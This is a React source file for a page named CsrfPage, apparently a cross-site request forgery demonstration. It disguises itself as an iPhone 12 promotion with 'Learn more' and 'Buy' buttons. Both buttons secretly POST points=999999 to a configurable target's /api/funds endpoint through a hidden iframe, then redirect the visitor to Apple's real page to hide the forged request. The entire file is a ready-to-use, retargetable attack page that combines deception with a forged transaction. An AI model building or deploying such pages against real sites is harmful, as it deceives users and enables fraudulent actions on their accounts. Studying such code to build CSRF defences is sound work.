import React from 'react';
import s from './index.module.css';
import axios from 'axios';
class CsrfPage extends React.Component {
    static getInitialProps({query}) {
        return {query}
    }
    onClick(){
        window.location.href = "https://www.apple.com/tw/iphone-12/";
    }
    render(){
        const {target="game.com"} = this.props.query;
        return (
            <div>
                <div className={s.iphone_big}>
                    <iframe className={s.hidden} name="iframeHidden"/>
                    <div className={s.iphone_big_btn1}>
                        <form method="POST" action={`http://${target}/api/funds`} target="iframeHidden">
                            <input type="hidden" name="points" value="999999"/>
                            <input type="submit" className="span4 btn btn-primary" value={"進一步了解"} onClick={this.onClick}/>
                         </form>
                    </div>
                    <div className={s.iphone_big_btn2}>
                        <form method="POST" action={`http://${target}/api/funds`} target="iframeHidden">
                            <input type="hidden" name="points" value="999999"/>
                            <input type="submit" className="span4 btn btn-primary" value={"購買"} onClick={this.onClick}/>
                        </form>
                    </div>
                </div>

            </div>);
    }
}


export default CsrfPage